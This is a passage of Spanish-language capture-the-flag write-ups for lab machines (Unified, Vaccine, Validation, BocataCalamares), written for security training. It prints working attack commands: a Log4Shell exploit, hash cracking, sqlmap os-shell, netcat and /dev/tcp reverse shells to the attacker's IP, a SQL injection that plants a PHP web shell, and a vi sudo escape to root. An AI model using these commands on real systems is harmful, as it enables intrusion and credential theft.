   Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Sun, 29 Dec 2024 20:07:03 GMT\n|     Connection: close\n|     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 \n|     Request&lt;/title&gt;&lt;style type=\"text/css\"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 \n|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre> </li> <li> <p>8880/tcp open  cddbp-alt?</p> <pre><code>fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.1 404 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 431\n|     Date: Sun, 29 Dec 2024 20:06:46 GMT\n|     Connection: close\n|     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 \n|     Found&lt;/title&gt;&lt;style type=\"text/css\"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404 \n|     Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\n|   GetRequest: \n|     HTTP/1.1 400 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Sun, 29 Dec 2024 20:06:45 GMT\n|     Connection: close\n|     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 \n|     Request&lt;/title&gt;&lt;style type=\"text/css\"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 \n|     Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\n|   HTTPOptions: \n|     HTTP/1.1 400 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Sun, 29 Dec 2024 20:06:51 GMT\n|     Connection: close\n|     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 \n|     Request&lt;/title&gt;&lt;style type=\"text/css\"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 \n|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre> </li> </ul> </li> </ul>"},{"location":"Writeup-ctfs/HackTheBox/Unified/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Unified/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Vemos que el puerto 8443 corre el software UniFi Network que es vunerable  a : </p> <p>CVE-2021-44228</p> <p>Buscamos el exploit :</p> <p>https://github.com/puzzlepeaches/Log4jUnifi</p> <p>Ejecutando el xploit tenemos RCE en la maquina haciendo :</p> <pre><code>\u276f python3 exploit.py -u https://10.129.164.42:8443 -i 10.10.14.208 -p 4443\n</code></pre> <p>Una vez nos conectamos , enumeramos la base de datos mongo, para cambiar el password de administrador y poder acceder via web:</p> <p>Opciones dentro de mongo</p> <pre><code>show dbs # Muestra las bases de datos\nuse db # selecciona la base de datos para trabajar\nshow collections # Muestra contenido de la bd (ex:admin,config)\ndb.admin.find() # Muestra contenido de la tabla\n</code></pre> <p>Podemos ver el contenido igualmente haciendo:</p> <pre><code>mongo --port 27117 ace --eval \"db.admin.find().forEach(printjson);\"\n</code></pre> <p>Para cambiar el password por uno nuevo, hacemos:</p> <pre><code>mkpasswd -m sha-512 test123\n\n# Genera un password con el mismo formato\n# Si identificamos el hash ($6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.) nos dice que es un SHA-512\n\n$6$ZodQMsUBsAjSApZ4$SVQpJGZOC3v2XeFIezGrXLvSfxd2RoZpgaODN7cKpxYtQELjZaOZKEiGwiT8KpuYf3EsfV3e7D7GGqPfI49rt.\n</code></pre> <p>Para actualizar el password en mongo:</p> <pre><code>mongo --port 27117 ace --eval 'db.admin.update({\"_id\":ObjectId(\"61ce278f46e0fb0012d47ee4\")},{$set:{\"x_shadow\":\"$6$ZodQMsUBsAjSApZ4$SVQpJGZOC3v2XeFIezGrXLvSfxd2RoZpgaODN7cKpxYtQELjZaOZKEiGwiT8KpuYf3EsfV3e7D7GGqPfI49rt.\"}})'\n</code></pre> <p>Para verificar que se ha cambiado el password:</p> <pre><code>mongo --port 27117 ace --eval \"db.admin.find().forEach(printjson);\"\nMongoDB shell version v3.6.3\nconnecting to: mongodb://127.0.0.1:27117/ace\nMongoDB server version: 3.6.3\n{\n    \"_id\" : ObjectId(\"61ce278f46e0fb0012d47ee4\"),\n    \"name\" : \"administrator\",\n    \"email\" : \"administrator@unified.htb\",\n    \"x_shadow\" : \"$6$ZodQMsUBsAjSApZ4$SVQpJGZOC3v2XeFIezGrXLvSfxd2RoZpgaODN7cKpxYtQELjZaOZKEiGwiT8KpuYf3EsfV3e7D7GGqPfI49rt.\",\n    \"time_created\" : NumberLong(1640900495),\n    \"last_site_name\" : \"default\",\n    \"ui_settings\" : {\n        \"neverCheckForUpdate\" : true,\n        \"statisticsPrefferedTZ\" : \"SITE\",\n        \"statisticsPreferBps\" : \"\",\n        \"tables\" : {\n\n # Aparece el nuevo password\n</code></pre> <p>Con el nuevo password, probamos a logarnos en la web. </p> <p>En la parte de configuracion, vemos el password para acceder por ssh como root;</p> <p></p> <p>Password:  NotACrackablePassword4U2022</p>"},{"location":"Writeup-ctfs/HackTheBox/Unified/#explotacion-2","title":"Explotaci\u00f3n 2","text":"<p>Accedermos por SSH con el password de root: </p> <pre><code>ssh root@10.129.164.42\nThe authenticity of host '10.129.164.42 (10.129.164.42)' can't be established.\nED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.129.164.42' (ED25519) to the list of known hosts.\nroot@10.129.164.42's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n * Super-optimized for small spaces - read how we shrank the memory\n   footprint of MicroK8s to make it the smallest full K8s around.\n\n   https://ubuntu.com/blog/microk8s-memory-optimisation\n\nroot@unified:~# ls\nroot.txt\nroot@unified:~# cd    \nroot@unified:~# cat root.txt\ne50bc93c75b634e4b272d2f771c33681\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Unified/#explotacion-3","title":"Explotaci\u00f3n 3","text":""},{"location":"Writeup-ctfs/HackTheBox/Unified/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 No tuvimos que escalar privilegios ya que se nos facilita en la web el usuario root para acceder por SSH"},{"location":"Writeup-ctfs/HackTheBox/Unified/#escalada-de-privilegios","title":"Escalada de privilegios","text":""},{"location":"Writeup-ctfs/HackTheBox/Unified/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina que no he podido resolver solo por falta de conocimientos de MongoDB"},{"location":"Writeup-ctfs/HackTheBox/Vaccine/","title":"Vaccine","text":"<p>\ud83e\udde0 Plataforma: HackTheBox</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Very Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 27 de diciembre de 2024 16:56</p> <p>\ud83c\udf10 IP: <code>10.129.249.41</code></p>"},{"location":"Writeup-ctfs/HackTheBox/Vaccine/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento inicial de la maquina"},{"location":"Writeup-ctfs/HackTheBox/Vaccine/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.249.41 -oG allports\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Vaccine/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <p>Buscamos con los scrips de reconocimiento las versiones </p> <p></p> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>21 / FTP :  vsftpd 3.0.3</li> </ul> <pre><code>21/tcp open  ftp     vsftpd 3.0.3\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:10.10.14.140\n|      Logged in as ftpuser\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 1\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip\n</code></pre> <p>Enumeramos el servidor FTP. Vemos que permite conexi\u00f3n \u201canonymous\u201d . Descargamos fichero backup.zip</p> <pre><code>get backup.zip\n</code></pre> <p>Descomprimimos el fichero : Nos pide password para el archivo.</p> <pre><code>\u276f unzip backup.zip\nArchive:  backup.zip\n[backup.zip] index.php password: %       \n</code></pre> <p>Con Zip2Johb sacamos el hash para crackear el password con John:</p> <pre><code>zip2john backup.zip &gt; zip.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt zip.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n741852963        (backup.zip)     \n1g 0:00:00:00 DONE (2024-12-27 17:18) 25.00g/s 204800p/s 204800c/s 204800C/s 123456..whitetiger\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <p>Password: 741852963</p> <p>Descomprimimos el fichero y buscamos dentro del fichero \u201cindex.php\u201d credenciales de usaurio:</p> <pre><code>cat index.php | grep password\n  if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])) {\n    if($_POST['username'] === 'admin' &amp;&amp; md5($_POST['password']) === \"2cb42f8734ea607eefed3b70af13bbd3\") {\n        &lt;label for=\"login__password\"&gt;&lt;svg class=\"icon\"&gt;&lt;use xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"#lock\"&gt;&lt;/use&gt;&lt;/svg&gt;&lt;span class=\"hidden\"&gt;Password&lt;/span&gt;&lt;/label&gt;\n        &lt;input id=\"login__password\" type=\"password\" name=\"password\" class=\"form__input\" placeholder=\"Password\" required&gt;\n</code></pre> <p>Username  : admin</p> <p>Password: 2cb42f8734ea607eefed3b70af13bbd3</p> <p>Parece un password en hash md5. Provamos de descifrar el hash con hashcat:</p> <pre><code>hashcat 2cb42f8734ea607eefed3b70af13bbd3 -m 0 /usr/share/wordlists/rockyou.txt\nDictionary cache built:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344392\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n* Runtime...: 3 secs\n\n2cb42f8734ea607eefed3b70af13bbd3:qwerty789 \n</code></pre> <p>Password: qwerty789 </p> <p>Enumeramos la web </p> <p></p> <p>Probamos a buscar con SQLMap si es vulenrable a SQLInjections:</p> <p>Enumeramos las tablas</p> <pre><code>sqlmap -u 'http://10.129.249.41/dashboard.php?search=1' --cookie \"PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1\" --tables\n</code></pre> <p>Enumeramos usuarios</p> <pre><code>\u276f sqlmap -u 'http://10.129.249.41/dashboard.php?search=1' --cookie \"PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1\" --users\n\ndatabase management system users [1]:\n[*] postgres\n</code></pre> <p>Con \u201c - - os- shell\u201d podemos ejecutar comandos en la bd y ver los usuarios:</p> <pre><code>sqlmap -u 'http://10.129.249.41/dashboard.php?search=1' --cookie \"PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1\" --os-shell\n\nos-shell&gt; whoami\ndo you want to retrieve the command standard output? [Y/n/a] y\n[18:22:19] [INFO] retrieved: 'postgres'\n</code></pre> <p>Buscamos los passwords con :</p> <pre><code>sqlmap -u 'http://10.129.249.41/dashboard.php?search=1' --cookie \"PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1\" --passwords --batch\n\ndatabase management system users password hashes:\n[*] postgres [1]:\n    password hash: md52d58e0637ec1e94cdfba3d1c26b67d01\n</code></pre> <p>Vemos que es un MD5, probamos con hashcat:</p> <pre><code>hashcat 2d58e0637ec1e94cdfba3d1c26b67d01 -m 0 /usr/share/wordlist/rockyou.txt\n</code></pre> <p>No encuentra nada, por lo que buscamos el hash en hashes.com y encontramos :</p> <p>Hash :2d58e0637ec1e94cdfba3d1c26b67d01</p> <p>Password: P@s5w0rd!postgres</p> <ul> <li>80 / TCP : Apache httpd 2.4.41 ((Ubuntu))</li> </ul> <pre><code>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: MegaCorp Login\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n</code></pre> <ul> <li>22/SSH : OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)</li> </ul> <pre><code>22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)\n|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)\n|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)\n</code></pre> </li> </ul>"},{"location":"Writeup-ctfs/HackTheBox/Vaccine/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Vaccine/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Aprovechando la funci\u00f3n de os-shell de sqlmap, mandamos una revershell:</p> <pre><code>os-shell&gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.140 4444 &gt;/tmp/f\n</code></pre> <p>Obtenemos revershell:</p> <p></p> <p></p> <p>Miramos que hay en la parte de la web:</p> <p>Buscamos dentro la pagina dashboard.php en busca de password</p> <pre><code>postgres@vaccine:/var/www/html$ cat dashboard.php | grep \"password\"\n     $conn = pg_connect(\"host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!\");\n(remote) postgres@vaccine:/var/www/html$ \n</code></pre> <p>Encontramos un fichero user.txt;</p> <p>User.txt: ec9b13ca4d6229cd5cc1e09980965bf7</p>"},{"location":"Writeup-ctfs/HackTheBox/Vaccine/#explotacion-2","title":"Explotaci\u00f3n 2","text":""},{"location":"Writeup-ctfs/HackTheBox/Vaccine/#explotacion-3","title":"Explotaci\u00f3n 3","text":""},{"location":"Writeup-ctfs/HackTheBox/Vaccine/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Probamos a buscar privilegios"},{"location":"Writeup-ctfs/HackTheBox/Vaccine/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<pre><code>sudo -l\n(remote) postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l\n[sudo] password for postgres: \nMatching Defaults entries for postgres on vaccine:\n    env_keep+=\"LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET\", env_keep+=\"XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH\",\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, mail_badpass\n\nUser postgres may run the following commands on vaccine:\n    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf\n</code></pre> <p>Leemos el fichero con permiso sudo :</p> <pre><code>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf\nP@s5w0rd!\n #GTF OBINS : una vez dentro de vi\n:set shell=/bin/sh\n:shell\n\nroot@vaccine:/var/lib/postgresql/11/main\\[\\]$ id\nuid=0(root) gid=0(root) groups=0(root)\nroot@vaccine:/var/lib/postgresql/11/main\\[\\]$ cd /root\n/var/lib/postgresql/11/main\\[\\]$ cat root.txt\ndd6e058e814260bc70e9bbdef2715849\n</code></pre> <p>Root.txt: dd6e058e814260bc70e9bbdef2715849</p>"},{"location":"Writeup-ctfs/HackTheBox/Vaccine/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina facil. Aprendemos comandos SQLMap. Tener presente tema cookie para identificarse antes de enumerar. Escalada sencilla."},{"location":"Writeup-ctfs/HackTheBox/Validation/","title":"Validation","text":""},{"location":"Writeup-ctfs/HackTheBox/Validation/#validation_1","title":"Validation","text":"<p>\ud83e\udde0 Plataforma: HackTheBox</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 26 de enero de 2025 20:21</p> <p>\ud83c\udf10 IP: <code>10.10.11.116</code></p>"},{"location":"Writeup-ctfs/HackTheBox/Validation/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Que sistema es</p> <pre><code>whichSystem.py 10.10.11.116\n\n    10.10.11.116 (ttl -&gt; 63): Linux\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Validation/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.10.11.116 -oG targeted\n\nPORT     STATE SERVICE    REASON\n22/tcp   open  ssh        syn-ack ttl 63\n80/tcp   open  http       syn-ack ttl 62\n4566/tcp open  kwtc       syn-ack ttl 63\n8080/tcp open  http-proxy syn-ack ttl 63\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Validation/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p22,80,4566,8080 -sCV 10.10.11.116 -oN targeted\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)\n|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)\n|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)\n80/tcp   open  http    Apache httpd 2.4.48 ((Debian))\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_http-server-header: Apache/2.4.48 (Debian)\n4566/tcp open  http    nginx\n|_http-title: 403 Forbidden\n8080/tcp open  http    nginx\n|_http-title: 502 Bad Gateway\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3</li> <li>80/tcp   open  http    Apache httpd 2.4.48</li> <li>4566/tcp open  http    nginx</li> <li>8080/tcp open  http    nginx</li> </ul> </li> <li> <p>Enumeraci\u00f3n web</p> <p>Whatweb</p> <pre><code>whatweb 10.10.11.116\n\u276f whatweb 10.10.11.116\nhttp://10.10.11.116 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]\n</code></pre> </li> </ul> <p>Vemos un formulario web</p> <p></p> <p>En primer lugar, hacemos una captura de la peticion del formulario y observamos dos campos: username y country</p> <p>Probamos a inyectar una comilla y vemos que salta un error en la web : </p> <pre><code>Brazil\u2019\n</code></pre> <p></p> <p></p> <p>Vemos que el campo es vulnerable. Probamos a ver si cerrando la consulta sigue mostrando error y vemos que no</p> <pre><code>username=test&amp;country=Brazil' -- -\n</code></pre> <p></p> <p>Entonces lo que probamos es a inyectar un payload en la consulta : Explotacion 1</p>"},{"location":"Writeup-ctfs/HackTheBox/Validation/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/HackTheBox/Validation/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Webshell en consulta SQL</p> <pre><code>Brazil' UNION SELECT \"&lt;?php SYSTEM($_REQUEST['cmd']); ?&gt;\" INTO OUTFILE\n'/var/www/html/shell.php'-- -\n</code></pre> <p>Accedemos a la pagina y muesta un error</p> <p></p> <p>Accedemos ahora a :</p> <pre><code>http://10.10.11.116/shell.php?cmd=id\n</code></pre> <p></p> <p>Obtenemos RCE</p> <p>Vamos a tratar de establecer una conexi\u00f3n :</p>"},{"location":"Writeup-ctfs/HackTheBox/Validation/#explotacion-2","title":"Explotaci\u00f3n 2","text":"<p>Maquina atacante (10.10.16.15)</p> <pre><code>nc -lvnp 4444\n</code></pre> <pre><code> curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.16.15/4444 0&gt;&amp;1\"'\n</code></pre> <p>Obtenemos la rever</p> <p>Tratamiento de la shell</p> <pre><code>script -c bash /dev/null\nCtr+z\nstty raw echo; fg\nreset xter\nexort TERM=XTERM\nexport SHELL=BASH\n</code></pre> <pre><code> www-data@validation:/var/www/html$ cd /home                                     \n www-data@validation:/home$ ls                                                   \nhtb\n www-data@validation:/home$ cd htb/                                              \n www-data@validation:/home/htb$ ls                                               \nuser.txt\n www-data@validation:/home/htb$ cat user.txt                                     \nc7080c211cb057271c11a2a99e353cfc\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Validation/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Accedemos con las credenciales encontradas"},{"location":"Writeup-ctfs/HackTheBox/Validation/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<pre><code>  www-data@validation:/var/www$ cd html/                                          \n www-data@validation:/var/www/html$ ls                                           \naccount.php  config.php  css  index.php  js\n www-data@validation:/var/www/html$ ls                                           \naccount.php  config.php  css  index.php  js\n www-data@validation:/var/www/html$ cat c                                        \ncat: c: No such file or directory\n www-data@validation:/var/www/html$ cat config.php                               \n&lt;?php\n  $servername = \"127.0.0.1\";\n  $username = \"uhc\";\n  $password = \"uhc-9qual-global-pw\";\n  $dbname = \"registration\";\n\n  $conn = new mysqli($servername, $username, $password, $dbname);\n?&gt;\n-data@validation:/var/www/html$ su root                                      \nPassword: \nroot@validation:/var/www/html# cd /root\nroot@validation:~#                                                                       root@validation:~# ls\nconfig  ipp.ko  root.txt  snap\nroot@validation:~#                                                                       root@validation:~# cat root.txt \nfed0181e2ccf9450d4956bc2302b3734\nroot@validation:~#                                                                       root@validation:~# \n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Validation/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina que he tenido que mirar wrtite up pues no sabia como continuar. He empezado usando SQLMap y me he estancado con ello."},{"location":"Writeup-ctfs/TheHackerLabs/BocataCalamares/","title":"BocataCalamares","text":"<p>Plataforma: HackersLabs OS: Linux Level: Easy Status: Done Complete: Yes Created time: 15 de febrero de 2025 17:01 IP: 192.168.0.235</p>"},{"location":"Writeup-ctfs/TheHackerLabs/BocataCalamares/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Identificando red</p> <pre><code> sudo arp-scan -I eth0 --localnet\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:c6:24:65, IPv4: 192.168.0.246\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.0.1 02:10:18:37:9b:14   (Unknown: locally administered)\n192.168.0.91    a0:88:69:69:7d:2d   Intel Corporate\n192.168.0.110   24:2f:d0:54:73:f6   (Unknown)\n192.168.0.202   fc:8f:90:a5:1d:14   Samsung Electronics Co.,Ltd\n192.168.0.235   00:0c:29:4e:45:4e   VMware, Inc.\n</code></pre>"},{"location":"Writeup-ctfs/TheHackerLabs/BocataCalamares/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.235 -oG targeted\n\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\nMAC Address: 00:0C:29:4E:45:4E (VMware)\n</code></pre>"},{"location":"Writeup-ctfs/TheHackerLabs/BocataCalamares/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>sudo nmap -sCV 192.168.0.235 -oN targeted\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 a6:3f:47:73:4c:6d:b3:23:29:fa:f8:1f:1d:42:44:b9 (ECDSA)\n|_  256 11:b8:dc:df:a9:c1:9f:b5:8f:55:93:a4:ef:65:c8:d5 (ED25519)\n80/tcp open  http    nginx 1.24.0 (Ubuntu)\n|_http-title: AFN\n|_http-server-header: nginx/1.24.0 (Ubuntu)\nMAC Address: 00:0C:29:4E:45:4E (VMware)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5</li> <li>80/tcp open  http    nginx 1.24.0 (Ubuntu)</li> </ul> </li> <li> <p>Enumeraci\u00f3n web</p> <p></p> </li> </ul> <p>Fuzzing</p> <pre><code>gobuster dir -u 'http://192.168.0.235' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt\n\nStarting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 178] [--&gt; http://192.168.0.235/images/]\n/index.php            (Status: 200) [Size: 4145]\n/login.php            (Status: 200) [Size: 2543]\n/admin.php            (Status: 200) [Size: 359]\n</code></pre> <p>Login.php</p> <p></p> <p>Ya que la webpricipal hace alusi\u00f3n a injecciones de SQL, probamos alguna con Burpsuite:</p> <p></p> <p>Nos lleva directos  :</p> <p>Admin.php</p> <p></p> <p>To-do-list</p> <p></p> <p>Sacamos de aqu\u00ed que la web es lee-archivos en base64</p> <pre><code>echo 'lee_archivos' | base64\nbGVlX2FyY2hpdm9zCg==\n</code></pre> <p>La web por tanto es bGVlX2FyY2hpdm9zCg==.php</p> <p></p> <p>Interceptamos con Burpsuite y vemos este c\u00f3digo:</p> <p></p> <pre><code>&lt;html&gt;\n\n    &lt;form method=\"post\" action=\"bGVlX2FyY2hpdm9zCg==.php\"&gt;\n        &lt;label for=\"archivo\"&gt; Introduce el archivo a buscar: &lt;/label&gt;\n        &lt;input type=\"text\" id=\"archivo\" name=\"archivo\" required&gt; \n        &lt;button type=\"submit\"&gt;Leer&lt;/button&gt;\n    &lt;/form&gt;\n\n    &lt;pre&gt;&lt;/pre&gt;\n&lt;!-- Tengo que limitar los archivos que se pueden ver, al menos hasta que los usuarios tengan unas contrase\u00f1as m\u00e1s robustas --&gt;\n&lt;!-- Si alguien leyera el archivo donde se encuentran los usuarios y usara la herramienta hydra para atacar nuestro servicio ssh... Bueno, ma\u00f1ana me encargare de ello --&gt;\n&lt;/html&gt;\n</code></pre> <p>Probamos a leer el /etc/passwd</p> <p></p> <p></p> <p>Obtenemos el fichero y con el los usuarios. 